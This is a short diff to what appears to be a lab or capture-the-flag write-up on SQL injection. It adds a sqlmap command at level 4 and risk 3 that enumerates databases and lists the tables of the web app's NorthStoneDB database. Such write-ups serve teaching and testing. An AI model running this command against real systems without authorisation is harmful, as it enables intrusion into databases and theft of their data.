@@ -172,4 +172,8 @@ available databases [5]:
 
 There are 4 default databases
 
-`NorthStoneDB` is what the web app is pulling from 
+`NorthStoneDB` is what the web app is pulling from
+
+```python
+sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch -D NorthStoneDB --tables
+```
